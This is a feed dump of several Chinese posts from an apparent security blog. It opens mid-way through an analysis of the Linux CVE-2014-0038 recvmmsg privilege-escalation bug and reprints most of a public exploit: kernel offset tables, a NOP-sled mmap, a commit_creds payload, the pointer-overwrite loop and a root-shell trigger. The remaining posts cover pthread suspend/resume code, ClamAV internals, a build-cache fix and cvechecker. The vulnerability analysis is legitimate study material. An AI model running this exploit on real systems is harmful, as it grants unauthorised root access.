+\*/
+sock-&amp;gt;sk-&amp;gt;sk\_err = -err;
+}
+return datagrams;
+}
+return err;
+&lt;/code>&lt;/pre>
+&lt;p>}
+&lt;code>该函数中对poll\_select\_set\_timeout(&amp;amp;end\_time, timeout-&amp;gt;tv\_sec, timeout-&amp;gt;tv\_nsec))。设定结束时间。然后如下的代码保证timeout&amp;gt;=0&lt;/code>
+if (timeout) {
+ktime_get_ts(timeout);
+*timeout = timespec_sub(end_time, *timeout);
+if (timeout-&amp;gt;tv_sec &amp;lt; 0) {
+timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;
+break;
+}&lt;/p>
+&lt;pre>&lt;code> /\* Timeout, return less than vlen datagrams \*/
+if (timeout-&amp;gt;tv\_nsec == 0 &amp;amp;&amp;amp; timeout-&amp;gt;tv\_sec == 0)
+break;
+}
+&lt;/code>&lt;/pre>
+&lt;p>&lt;code>此外，poll\_select\_set\_timeout会对timespec进行检查，因此传递进来的timeout的tv\_sec与tv\_nsec必须符合timeout结构体，也就是构造利用地址的时候，地址上下文必须符合特定内容。&lt;/code>
+/*
+* Returns true if the timespec is norm, false if denorm:
+*/ &lt;br>
+static inline bool timespec_valid(const struct timespec *ts)
+{
+/* Dates before 1970 are bogus */
+if (ts-&amp;gt;tv_sec &amp;lt; 0)
+return false;
+/* Can&amp;rsquo;t have more nanoseconds then a second */
+if ((unsigned long)ts-&amp;gt;tv_nsec &amp;gt;= NSEC_PER_SEC)
+return false;
+return true;
+}&lt;/p>
+&lt;pre>&lt;code class="language-而" data-lang="而">
+### 利用代码分析
+当前在exploit-db上有2个利用代码，利用原理基本相同，只是选用的构造地址的结构体不同，本文选用http://www.exploit-db.com/exploits/31347/中的exploit代码进行分析。 本exploit代码和其他很多内核提权代码利用方式大致相同，通过使用有漏洞的系统调用将一个特定的内核函数地址修改成用户空间地址，然后将提权代码映射到对应地址的用户空间中，这样当用户调用被修改的特定函数时，内核便执行了相关的提权代码。以下对应该利用代码进行详细说明。 大家都知道，在64位系统中，由于地址较多，内核空间和用户空间只需通过高几位是否为0或1进行区分，内核空间地址的范围是0xffff ffff ffff ffff~0xffff 8000 0000 0000，而用户空间的地址范围是0x0000 7ffff ffff ffff~0x0000 0000 0000 0000。因此只需使用timeout的流程将高位的1变成0即可。 该exploit代码使用net\_sysctl\_root结构体的net\_ctl\_permissions函数指针进行利用。由于各个内核版本中不同函数对应的地址不同，因此定义了一个结构体存放各个内核内核版本的函数地址，这样就可以在多个写了特定内核地址的内核上完成提权操作。```
+struct offset {
+char \*kernel\_version;
+unsigned long dest; // net\_sysctl\_root + 96
+unsigned long original\_value; // net\_ctl\_permissions
+unsigned long prepare\_kernel\_cred;
+unsigned long commit\_creds;
+};
+struct offset offsets\[\] = {
+{&amp;quot;3.11.0-15-generic&amp;quot;,0xffffffff81cdf400+96,0xffffffff816d4ff0,0xffffffff8108afb0,0xffffffff8108ace0}, // Ubuntu 13.10
+{&amp;quot;3.11.0-12-generic&amp;quot;,0xffffffff81cdf3a0,0xffffffff816d32a0,0xffffffff8108b010,0xffffffff8108ad40}, // Ubuntu 13.10
+{&amp;quot;3.8.0-19-generic&amp;quot;,0xffffffff81cc7940,0xffffffff816a7f40,0xffffffff810847c0, 0xffffffff81084500}, // Ubuntu 13.04
+{NULL,0,0,0,0}
+};
+```Exploit程序开始就使用该函数映射结构体对当前内核进行检查，获取出要使用的函数地址指针offsets\[i\]。 然后使用net\_ctl\_permissons的地址进行页对齐，之后将高6\*4位变成0，即设定为用户空间地址。```
+mmapped = (off-&amp;gt;original\_value &amp;amp; ~(sysconf(\_SC\_PAGE\_SIZE) - 1));
+mmapped &amp;amp;= 0x000000ffffffffff;
+```之后以该地址为基址map一段内存空间，设定该map区域可写、可执行。先用0x90填充该map区域，构造滑梯。然后将提权代码拷贝到该map区域。```
+mmapped = (long)mmap((void \*)mmapped, sysconf(\_SC\_PAGE\_SIZE)\*3, PROT\_READ|PROT\_WRITE|PROT\_EXEC, MAP\_PRIVATE|MAP\_ANONYMOUS|MAP\_FIXED, 0, 0);
+if(mmapped == -1) {
+perror(&amp;quot;mmap()&amp;quot;);
+exit(-1);
+}
+memset((char \*)mmapped,0x90,sysconf(\_SC\_PAGE\_SIZE)\*3);
+memcpy((char \*)mmapped + sysconf(\_SC\_PAGE\_SIZE), (char \*)&amp;amp;trampoline, 300);
+if(mprotect((void \*)mmapped, sysconf(\_SC\_PAGE\_SIZE)\*3, PROT\_READ|PROT\_EXEC) != 0) {
+perror(&amp;quot;mprotect()&amp;quot;);
+exit(-1);
+```提权代码是非常传统的内核提权代码，通过调用commit\_creds修改进程creds数据结构。注意commit\_creds和prepare\_kernel\_cred也是由特定于内核版本的内核地址信息获得，因此也包含在offset结构体中，需要依据特定的内核版本进行设定。```
+static int \_\_attribute\_\_((regparm(3)))
+getroot(void \*head, void \* table)
+{
+commit\_creds(prepare\_kernel\_cred(0));
+return -1;
+}
+void \_\_attribute\_\_((regparm(3)))
+trampoline()
+{
+asm(&amp;quot;mov $getroot, %rax; call \*%rax;&amp;quot;);
+}
+```准备环境已经就绪，接下来就需要调用有漏洞的\_\_NR\_recvmmsg来进行地址修改。即修改net\_sysctl\_root中permissions指针的数值。```
+static struct ctl\_table\_root net\_sysctl\_root = {
+.lookup = net\_ctl\_header\_lookup,
+.permissions = net\_ctl\_permissions,
+};
+```而ctl\_table\_root的定义为：```
+struct ctl\_table\_root {
+struct ctl\_table\_set default\_set;
+struct ctl\_table\_set \*(\*lookup)(struct ctl\_table\_root \*root,
+struct nsproxy \*namespaces);
+int (\*permissions)(struct ctl\_table\_header \*head, struct ctl\_table \*table);
+};
+```通过计算ctl\_table\_root可知：Permissions的位置为net\_sysctl\_root+96。这样依次使用系统调用的timeout将.permissions的值的高6\*4位从之前的1修改为0即可。```
+for(i=0;i &amp;lt; 3 ;i++) {
+udp(i);
+retval = syscall(\_\_NR\_recvmmsg, sockfd, msgs, VLEN, 0, (void \*)off-&amp;gt;dest+7-i);
+if(!retval) {
+fprintf(stderr,&amp;quot;\\nrecvmmsg() failed\\n&amp;quot;);
+}
+}
+```通过使用三次该系统调用，依次将0xFF\*\* \*\*\*\* \*\*\*\* \*\*\*\*,0x00FF \*\*\*\* \*\*\*\* \*\*\*\*， 0x0000 FF\*\* \*\*\*\* \*\*\*\*的FF修改为00. 执行完毕后，提权程序成功将permissions指向了填充了提权代码的用户空间中。注意：这里必须从高位开始处理，由于各个程序是并行处理的，因此无法准确的保证timeout值和sleep值完全匹配，又由于timeout值的tv\_sec&amp;gt;=0，因此只要从高位依次处理就可以避免借位的情况发生。这里也是结构体选取的条件之一。 由于0xff\*3 = 765,因此该提权程序需要13分钟才能将permissions指向的地址值变成用户空间的地址值。 万事具备，只欠东风。只要用户调用修改后的net\_sysctl\_root-&amp;gt;permissions即可。```
+void trigger() {
+open(&amp;quot;/proc/sys/net/core/somaxconn&amp;quot;,O\_RDONLY);
+if(getuid() != 0) {
+fprintf(stderr,&amp;quot;not root, ya blew it!\\n&amp;quot;);
+exit(-1);
+}
+fprintf(stderr,&amp;quot;w00p w00p!\\n&amp;quot;);
+system(&amp;quot;/bin/sh -i&amp;quot;);
+}
+```到此，该CVE分析完毕。不得不说该CVE的原理虽然比较简单，但实现最后利用修过的手法还是非常巧妙的，值得学习\\借鉴。
+### 参考
+1、[http://en.wikipedia.org/wiki/X32\_ABI](http://en.wikipedia.org/wiki/X32_ABI)&lt;/code>&lt;/pre>- /posts/%e5%86%85%e6%a0%b8cve-2014-0038%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/ - This is a customized copyright.</description></item><item><title>Linux下线程pthread实现suspend、resume的一种方式</title><link>/posts/linux_pthread_suspend_resume/</link><pubDate>Tue, 11 Mar 2014 13:22:58 +0000</pubDate><guid>/posts/linux_pthread_suspend_resume/</guid><description>seteuid0's blog /posts/linux_pthread_suspend_resume/ -&lt;p>Linux下线程pthread没有实现suspend,resume的相关功能，这几天项目需要，自己就使用pthread_cond_wait实现了下，把主要代码逻辑如下，贴出来供大家参考。 功能如下。 主线程监听用户消息，子线程完成实际任务。主线程需要依据用户输入控制工作子线程的暂停（suspend）和继续运行（resume）。 使用CTRL+C控制暂停、继续运行。 使用CTRL+\使程序退出，主线程先cancel，然后自己退出。 代码如下：&lt;/p>
+&lt;blockquote>
+&lt;pre>&lt;code>#include &amp;lt;pthread.h&amp;gt;
+#include &amp;lt;signal.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+typedef enum \_RUN\_STATUS{
+STATUS\_RUNNING = 0,
+STATUS\_PAUSE,
+}RUN\_STATUS;
+sigset\_t mask;
+RUN\_STATUS run\_status;
+pthread\_mutex\_t lock = PTHREAD\_MUTEX\_INITIALIZER;
+pthread\_cond\_t waitloc = PTHREAD\_COND\_INITIALIZER;
+void cleanup\_handler(void\*arg)
+{
+printf(&amp;quot;child thread cleanup\\n&amp;quot;);
+pthread\_mutex\_unlock(&amp;amp;lock);
+}
+void \* thread\_func(void\*arg)
+{
+int err, signo;
+pthread\_cleanup\_push(cleanup\_handler, NULL);
+for(;;){
+pthread\_mutex\_lock(&amp;amp;lock);
+if(run\_status == STATUS\_RUNNING){
+pthread\_mutex\_unlock(&amp;amp;lock);
+printf(&amp;quot;child pthread task running-&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;\\n&amp;quot;);
+sleep(1);
+}else{
+while(run\_status != STATUS\_RUNNING){
+pthread\_cond\_wait(&amp;amp;waitloc, &amp;amp;lock);
+printf(&amp;quot;running again\\n&amp;quot;);
+}
+pthread\_mutex\_unlock(&amp;amp;lock);
+}
+}
+pthread\_cleanup\_pop(0);
+return 0;
+}
+int main()
+{
+int ret;
+run\_status = STATUS\_RUNNING;
+sigset\_t oldmask;
+pthread\_t tid;
+int err, signo;
+sigemptyset(&amp;amp;mask);
+sigaddset(&amp;amp;mask, SIGINT);
+sigaddset(&amp;amp;mask, SIGQUIT);
+pthread\_t tid\_self = pthread\_self();
+if((ret = pthread\_sigmask(SIG\_BLOCK, &amp;amp;mask, &amp;amp;oldmask)) != 0)
+perror(&amp;quot;SIG\_BLOCK error&amp;quot;);
+ret = pthread\_create(&amp;amp;tid, NULL, thread\_func, 0);
+if(ret != 0)
+perror(&amp;quot;create thread&amp;quot;);
+sleep(3);
+for(;;){
+err = sigwait(&amp;amp;mask, &amp;amp;signo);
+if(err!=0)
+perror(&amp;quot;sigwait failed&amp;quot;);
+switch(signo){
+case SIGINT:
+pthread\_mutex\_lock(&amp;amp;lock);
+if(run\_status == STATUS\_RUNNING){
+run\_status = STATUS\_PAUSE;
+printf(&amp;quot;\[Pause\]\\n&amp;quot;);
+}else{
+run\_status = STATUS\_RUNNING;
+printf(&amp;quot;\[Resume\]\\n&amp;quot;);
+}
+pthread\_cond\_signal(&amp;amp;waitloc);
+pthread\_mutex\_unlock(&amp;amp;lock);
+break;
+case SIGQUIT:
+printf(&amp;quot;kill child thread.\\n&amp;quot;);
+sleep(1);
+pthread\_cancel(tid);
+pthread\_join(tid,NULL);
+printf(&amp;quot;exiting\\n&amp;quot;);
+return 0;
+default:
+printf(&amp;quot;unexpected signal %d\\n&amp;quot;, signo);
+return 1;
+}
+}
+return 0;
+}
+&lt;/code>&lt;/pre>&lt;/blockquote>
+&lt;p>关键字：pthread,thread,linux,pause,suspend,resume,线程,暂停，线程暂停，&lt;/p>
+- /posts/linux_pthread_suspend_resume/ - This is a customized copyright.</description></item><item><title>简要ClamAV安装、使用与实现分析</title><link>/posts/clamav_use_implement/</link><pubDate>Thu, 06 Mar 2014 10:52:57 +0000</pubDate><guid>/posts/clamav_use_implement/</guid><description>seteuid0's blog /posts/clamav_use_implement/ -&lt;p>ClamAV使用广泛且开源的杀毒软件，支持windows、linux、Unix等主流操作系统，除自身具有病毒查杀功能外，还支持邮件、http代理扫描等插件方式。&lt;/p>
+&lt;h2 id="安装">安装&lt;/h2>
+&lt;p>由于ClamAV的广泛使用，很多发行版的源里都有clamav，只需要使用相应的包管理工具进行安装即可。如fedora或ubuntu下只需执行：&lt;/p>
+&lt;blockquote>
+&lt;p>yum install -y clamav-* sudo apt-get install clamav-*&lt;/p>
+&lt;/blockquote>
+&lt;p>但然，你也可以源码包安装，网上有很多教程，这里就不在多说。&lt;/p>
+&lt;h2 id="使用">使用&lt;/h2>
+&lt;p>杀毒软件最终要的当然是病毒库，使用前当然是更新最新的病毒库。&lt;/p>
+&lt;blockquote>
+&lt;p>freshclam&lt;/p>
+&lt;/blockquote>
+&lt;p>ClamAv有2种使用模式，单个程序查杀和前、后台模式查杀。 clamscan就是单个程序查杀的程序，它调用libclamav库完成对指定目录、文件的扫描检查。 clamd、clamdscan是前、后台模式的查杀工具。从名字就可以看出clamd是提供查杀服务的daemon程序，clamdscan是调用查杀服务的客户端。 最简单的使用方式就是命令后加你要扫描的文件或目录，如：&lt;/p>
+&lt;blockquote>
+&lt;p>  clamdscan  ～/&lt;/p>
+&lt;/blockquote>
+&lt;p>ClamAv当然也支持很多参数进行扫描定制，这里略过。 除了命令行的工具外还有很多第三方的图形化工具，如clamtk，更多的见：http://www.clamav.net/lang/en/download/third-party-tools/3rdparty-gui/&lt;/p>
+&lt;h2 id="实现分析">实现分析&lt;/h2>
+&lt;p>ClamAv实现的是最原始的特征码扫描，而加载特征码库与实现扫描功能的代码都在libclamav库中实现，两种使用模式都是调用该库完成对应的扫描功能。 libclamav库API提供了病毒扫描的各种函数接口。从病毒中提取的特征字符串被用一定的格式组织在一起并加上签名保护就形成了病毒库，clamav使用的病毒库一般后缀为.cvd文件。 libclamav库的病毒扫描法使用Aho-Corasick精确字符串匹配算法，将病毒库中的特征码与文件中的字符串进行比较，以确定文件中是否有字符串精确匹配上病毒库中的特征码，从而确定是否感染病毒。 Aho-Corasick在Boyer-Moore算法基础上进行了的多种改进，Boyer Moore算法对要搜索的字符串进行逆序字符比较，当被搜索的字符串中的字符在特征字符串中不存在时，将跳过搜索字符串中一个子段。Boyer Moore算法还利用上一次比较的结果来确定下一次的比较位置，Boyer Moore算法与线性搜索比起来每次移动的步长比较多，线性搜索每次移动一个字符，因此，Boyer Moore算法比线性搜索快得多。Aho-Corasick通过创建一种状态图并采用由软件实现的有限状态机来确定字符串在文本中的位置，消除了搜索性能与字符串数量的相关性。 当然ClamAV必须实现相应的两个算法，看如下数据结构：&lt;/p>
+&lt;blockquote>
+&lt;p>struct cli_matcher { unsigned int type; /* Extended Boyer-Moore */ uint8_t *bm_shift; struct cli_bm_patt **bm_suffix, **bm_pattab; uint32_t *soff, soff_len; /* for PE section sigs */ uint32_t bm_offmode, bm_patterns, bm_reloff_num, bm_absoff_num; /* HASH */ struct cli_hash_patt hm; /* Extended Aho-Corasick */ uint32_t ac_partsigs, ac_nodes, ac_patterns, ac_lsigs; struct cli_ac_lsig **ac_lsigtable; struct cli_ac_node *ac_root, **ac_nodetable; struct cli_ac_patt **ac_pattable; struct cli_ac_patt **ac_reloff; uint32_t ac_reloff_num, ac_absoff_num; uint8_t ac_mindepth, ac_maxdepth; struct filter *filter; uint16_t maxpatlen; uint8_t ac_only; #ifdef USE_MPOOL mpool_t *mempool; #endif };&lt;/p>
+&lt;/blockquote>
+&lt;p>ClamAV的病毒库也支持多种多样，看如下一段病毒库加载过程的代码片段，clamav依据不同的病毒库格式进行不同的加载方式：&lt;/p>
+&lt;blockquote>
+&lt;p>   if(cli_strbcasestr(dbname, &amp;ldquo;.db&amp;rdquo;)) { ret = cli_loaddb(fs, engine, signo, options, dbio, dbname);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.cvd&amp;rdquo;)) { ret = cli_cvdload(fs, engine, signo, options, 0, filename, 0);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.cld&amp;rdquo;)) { ret = cli_cvdload(fs, engine, signo, options, 1, filename, 0);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.hdb&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.hsb&amp;rdquo;)) { ret = cli_loadhash(fs, engine, signo, MD5_HDB, options, dbio, dbname); } else if(cli_strbcasestr(dbname, &amp;ldquo;.hdu&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.hsu&amp;rdquo;)) { if(options &amp;amp; CL_DB_PUA) ret = cli_loadhash(fs, engine, signo, MD5_HDB, options | CL_DB_PUA_MODE, dbio, dbname); else skipped = 1;   } else if(cli_strbcasestr(dbname, &amp;ldquo;.fp&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.sfp&amp;rdquo;)) { ret = cli_loadhash(fs, engine, signo, MD5_FP, options, dbio, dbname); } else if(cli_strbcasestr(dbname, &amp;ldquo;.mdb&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.msb&amp;rdquo;)) { ret = cli_loadhash(fs, engine, signo, MD5_MDB, options, dbio, dbname);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.mdu&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.msu&amp;rdquo;)) { if(options &amp;amp; CL_DB_PUA) ret = cli_loadhash(fs, engine, signo, MD5_MDB, options | CL_DB_PUA_MODE, dbio, dbname); else skipped = 1;   } else if(cli_strbcasestr(dbname, &amp;ldquo;.ndb&amp;rdquo;)) { ret = cli_loadndb(fs, engine, signo, 0, options, dbio, dbname);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.ndu&amp;rdquo;)) { if(!(options &amp;amp; CL_DB_PUA)) skipped = 1; else ret = cli_loadndb(fs, engine, signo, 0, options | CL_DB_PUA_MODE, dbio, dbname);   } else if(cli_strbcasestr(filename, &amp;ldquo;.ldb&amp;rdquo;)) { ret = cli_loadldb(fs, engine, signo, options, dbio, dbname);   } else if(cli_strbcasestr(filename, &amp;ldquo;.ldu&amp;rdquo;)) { if(options &amp;amp; CL_DB_PUA) ret = cli_loadldb(fs, engine, signo, options | CL_DB_PUA_MODE, dbio, dbname); else skipped = 1; } else if(cli_strbcasestr(filename, &amp;ldquo;.cbc&amp;rdquo;)) { if(options &amp;amp; CL_DB_BYTECODE) ret = cli_loadcbc(fs, engine, signo, options, dbio, dbname); else skipped = 1; } else if(cli_strbcasestr(dbname, &amp;ldquo;.sdb&amp;rdquo;)) { ret = cli_loadndb(fs, engine, signo, 1, options, dbio, dbname);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.zmd&amp;rdquo;)) { ret = cli_loadmd(fs, engine, signo, 1, options, dbio, dbname);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.rmd&amp;rdquo;)) { ret = cli_loadmd(fs, engine, signo, 2, options, dbio, dbname);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.cfg&amp;rdquo;)) { ret = cli_dconf_load(fs, engine, options, dbio);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.info&amp;rdquo;)) { ret = cli_loadinfo(fs, engine, options, dbio);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.wdb&amp;rdquo;)) { if(options &amp;amp; CL_DB_PHISHING_URLS) { ret = cli_loadwdb(fs, engine, options, dbio); } else skipped = 1; } else if(cli_strbcasestr(dbname, &amp;ldquo;.pdb&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.gdb&amp;rdquo;)) { if(options &amp;amp; CL_DB_PHISHING_URLS) { ret = cli_loadpdb(fs, engine, signo, options, dbio); } else skipped = 1; } else if(cli_strbcasestr(dbname, &amp;ldquo;.ftm&amp;rdquo;)) { ret = cli_loadftm(fs, engine, options, 0, dbio);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.ign&amp;rdquo;) || cli_strbcasestr(dbname, &amp;ldquo;.ign2&amp;rdquo;)) { ret = cli_loadign(fs, engine, options, dbio);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.idb&amp;rdquo;)) { ret = cli_loadidb(fs, engine, signo, options, dbio);   } else if(cli_strbcasestr(dbname, &amp;ldquo;.cdb&amp;rdquo;)) { ret = cli_loadcdb(fs, engine, signo, options, dbio); } else { cli_dbgmsg(&amp;ldquo;cli_load: unknown extension - assuming old database format\n&amp;rdquo;); ret = cli_loaddb(fs, engine, signo, options, dbio, dbname); }&lt;/p>
+&lt;/blockquote>
+&lt;p>调用函数cl_loaddb装载病毒库时，函数cl_loaddb将病毒库文件clamav/database/main.cvd经数字签名验证和解压缩后，存放在在/tmp目录下生成临时目录中。病毒库解码成main.db、main.ndb、main.zmd和main.fp几个库，然后依次将这些库解析出病毒数据存放在病毒数据链表中，解析完后，会删除这些临时病毒库文件。 解码的病毒库经装载后形成病毒数据链表，所有的数据存放在结构cl_node实例root中，当扫描病毒时，使用root中的数据与文件中数据进行匹配，以确定是否染病毒。 理解了临时病毒库的结构，就很容易理解函数cl_loaddb解析病毒库的过程，因此，这里不分析函数cl_loaddb了。临时病毒库的结构分别说明如下： (1) main.db库 main.db库描述了一般文件病毒的特征码，使用Boyer Moore算法进行扫描。main.db库以‘=’符号为分隔符，前面为病毒名，后面为病毒特征码，对于&amp;quot;(Clam)&amp;ldquo;字符串必须从病毒名中剔除。main.db库的内容经函数cli_loaddb解析后，存于结构cli_bm_patt的virname和pattern成员中。每一个病毒对应一个cli_bm_patt结构实例，这些结构实例组成链表存入在结构cl_node中。 main.db库部分内容列出如下：&lt;/p>
+&lt;blockquote>
+&lt;p>_0017_0001_000=21b8004233c999cd218bd6b90300b440cd218b4c198b541bb80157cd21b43ecd2132ed8a4c18 _0017_0001_001=b3005a8b4e27b440cd21e8c2045a59b440cd21e81902b440cd21b8004233c999cd218bd6b90300&lt;/p>
+&lt;/blockquote>
+&lt;p>(2) main.fp 库main.fp数据用于填充结构cli_md5_node，函数cli_loadhdb解析库中的每一行，每行以&amp;rdquo;：&amp;ldquo;分隔字段，每个字段填入结构cli_md5_node中各成员，每行填充一个结构实例，多个实例组成链表。库main.fp数据部分数据如下：&lt;/p>
+&lt;blockquote>
+&lt;p>d1ef8a0e477570ad39f4667129400b05:1598056 :Submission 21770&lt;/p>
+&lt;/blockquote>
+&lt;p>(3) main.hdb 库main.hdb的解析与库main.fp类似，都填充结构cli_md5_node，解析函数都是函数cli_loadhdb，区别仅在于结构cli_md5_node填充0。库main.fp数据部分数据如下：&lt;/p>
+&lt;blockquote>
+&lt;p>0060c80aedf81b1e4b58358afe1bf299:761344 :Trojan.Beastdoor.207.B-cli 192bd7afb1479aad2b64a6c176773a01:761344:Trojan.Beastdoor.207.C-cli aaab755d9baf21baf05de8f32af2c996:57856:Trojan.BO.A-Cli d3edf9b7d99205afda64b3a7c1a63264:307200:Trojan.Boid.20-cli-1&lt;/p>
+&lt;/blockquote>
+&lt;p>在magic_scandesc的函数里面，会依据不同的文件类型调用不同的处理程序。如ELF的为cli_scanelf。cli_scanelf完成对elf文件的分析，而在magic_scandesc里面会调用cli_scanraw，这个函数就调用以上的模式匹配算法进行病毒库检查。在cli_lsig_eval完成判断。 举例： 现在clamav版本可以检查出cve-2013-2094的exploit程序fsheep，在daily.cld里可以找到该exploit的特征码：&lt;/p>
+&lt;blockquote>
+&lt;p>Unix.Exploit.Fsheep;Engine:51-255,Target:6;0&amp;amp;1&amp;amp;2&amp;amp;3&amp;amp;4;0F01F8E8050000000F01F848CF;2f62696e2f6261736800;2d736800;21736574756964283029;7364406675636b73686565702e6f72672032303130&lt;/p>
+&lt;/blockquote>
+&lt;p>而通过clamav的工具sigtool生成hex格式数据查找上面用“;”分割的各个特征码可以发现，特征码都在生成的hex格式的文件中。生成hex格式文件的方式为：&lt;/p>
+&lt;blockquote>
+&lt;p>cat semtex|sigtool &amp;ndash;hex-dump &amp;gt; hex.log&lt;/p>
+&lt;/blockquote>
+&lt;p>至于cli_lsig_eval等函数的处理就涉及到具体的算法时间，等有时间了再详细研究，就先简要的介绍到这里。&lt;/p>
+&lt;h2 id="参考">参考&lt;/h2>
+&lt;p>&lt;a href="http://www.clamav.net/lang/en/">http://www.clamav.net/lang/en/&lt;/a> &lt;a href="http://blog.csdn.net/wdbfz/article/details/6047161">http://blog.csdn.net/wdbfz/article/details/6047161&lt;/a>&lt;/p>
+- /posts/clamav_use_implement/ - This is a customized copyright.</description></item><item><title>file not recognized: File truncated错误解决办法</title><link>/posts/file-not-recognized-file-truncated%e9%94%99%e8%af%af%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95/</link><pubDate>Mon, 03 Mar 2014 02:30:17 +0000</pubDate><guid>/posts/file-not-recognized-file-truncated%e9%94%99%e8%af%af%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95/</guid><description>seteuid0's blog /posts/file-not-recognized-file-truncated%e9%94%99%e8%af%af%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95/ -&lt;p>使用rpmbuild重新编译clamav，遇到了：file not recognized: File truncated。感觉不像时程序代码问题，找到以下解决办法：&lt;/p>
+&lt;blockquote>
+&lt;p>when the compilation line looks like:&lt;code>c++ -Dmylib\_EXPORTS -Wall -Werror -g -fPIC -I/home/user/dev/mygit/build -I/home/user/dev/mygit/src -o CMakeFiles/mylib.dir/MyCppClass.cpp.o -c /home/user/dev/mygit/src/MyCppClass.cpp&lt;/code>comes from the fact that, as stated, the generated object (.o) file is empty (or just truncated). A quick look can also tell it:&lt;code>ls -l CMakeFiles/mylib.dir/&lt;/code>Now, when the issue remains even though you re-run the compilation line, it may come from the fact that the object (.o) file is empty/truncated within the compilation cache (ccache) itself. It may happen, for instance, when the machine/server is (abruptly) re-booted while a compilation is running. Indeed, it is highly probable that your c++ command wraps the use of a compilation cache:&lt;code>$ type c++ c++ is hashed (/usr/lib/ccache/c++)&lt;/code>If that is case, you can get rid of the compilation cache:&lt;code>rm -rf ~/.ccache&lt;/code>You still have to delete the truncated files from the current generated directory:```
+rm -rf CMakeFiles/mylib.dir/&lt;/p>
+&lt;pre>&lt;code class="language-and" data-lang="and">&lt;/code>&lt;/pre>&lt;/blockquote>
+&lt;p>验证后可以解决问题，看后才想起之前就遇到并用该方法解决了类似问题，过了好久都不记得了。 原因就是编译时会建立cache，由于编译被机器重启等事件中断，导致cache有问题，只需要把缓冲清空即可。 参考：http://fossdev.blogspot.com/2011/08/file-not-recognized-file-truncated.html&lt;/p>
+- /posts/file-not-recognized-file-truncated%e9%94%99%e8%af%af%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95/ - This is a customized copyright.</description></item><item><title>cvechecker实现原理分析</title><link>/posts/cvechecker%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/</link><pubDate>Thu, 27 Feb 2014 09:00:20 +0000</pubDate><guid>/posts/cvechecker%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/</guid><description>seteuid0's blog /posts/cvechecker%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/ -&lt;p>cvechecker是由Sven Vermeulen编写的可以用来扫描检查系统软件cve情况的软件，在SF上的下载量非常高。自己在fedora上使用了下，对比yum的信息发现存在比较严重的漏报和误报，抽空分析了下其实现方式，总结如下 。 使用过cvechecker的用户都会猜测使用的是nist的cve(Common Vulnerabilities and Exposures)[1]信息获取软件的cve列表，但是怎么和系统上的软件联系在一起呢？ 各个发行版都有自己的软件包管理系统，如redhat系列的rpm、yum。redhat、fedora负责维护rhel和fedora上各个软件包的cve信息，当执行软件包升级时，使用新的软件包替换存在cve的软件包。基于deb包的ubuntu和debian类似。因此，在特定的发行版中，只需要通过包管理器便可知道软件包的版本号，再辅以发行版提供的漏洞信息或者直接使用类似yum update的方式升级便可知道当前版本的CVE信息。 cvechecker是怎么做的呢？Sven没有依赖于包版本管理器，而是直接通过查找软件包的版本号，然后构造CPE（Common Platform Enumeration）[2]信息，通过在cve数据库中查找给CPE信息来提取CVE信息。 每个软件包都包含了众多的软件，如ls和cat都属于coreutils,那么如何从系统软件列表差找到软件包列表及版本号便是Sven方法的关键所在。通过查看代码发现，Sven自己维护了一个软件包和各个命令的映射关系表。（https://raw.github.com/sjvermeu/cvechecker/master/versions.dat）内容类似与：&lt;/p>
+&lt;blockquote>
+&lt;p>,perlivp,1,perlivp$,# perlivp v([0-9][0-9]*(\.[0-9]+)+),a,perl,perl,\1,,, ,libvorbis.so,1,libvorbis.so.*,Xiph.Org libVorbis ([0-9][0-9]*(\.[0-9]+)+),a,xiph,libvorbis,\1,,,&lt;/p>
+&lt;/blockquote>
+&lt;p>看过cvechecker帮助文档的用户都知道，用户自己也可以定义添加这种映射表，而默认的映射表是由Sven自己维护的，默认只有650条，因此这里就是漏报的一处主要原因。 这个隐射表解决了从命令到软件包的映射，但怎么获取软件包的版本号呢？继续看代码：&lt;/p>
+&lt;blockquote>
+&lt;p>/** * Here is where the various version extraction methods are supported. * We currently still only support a single method (1, which is the * &amp;ldquo;strings -n 3 &lt;!-- raw HTML omitted -->&amp;rdquo; command execution) but now we can see if we can * support additional methods as well. */ if (filetype == 1) { char buffer[BUFFERSIZE]; int ret; zero_string(buffer, BUFFERSIZE); ret = strings_extract_version(ws, &amp;amp;preg, pmatch, &amp;amp;cpe_data); if (ret == 0) { add_to_sqlite_database(ws, cpe_data); cpe_to_string(buffer, BUFFERSIZE, cpe_data); fprintf(stdout, &amp;quot; - Found match for %s/%s:\t%s\n&amp;quot;, ws-&amp;gt;currentdir, ws-&amp;gt;currentfile, buffer); }; } else { fprintf(stderr, &amp;quot; ! %s/%s: The sqlite3 implementation currently doesn&amp;rsquo;t support file 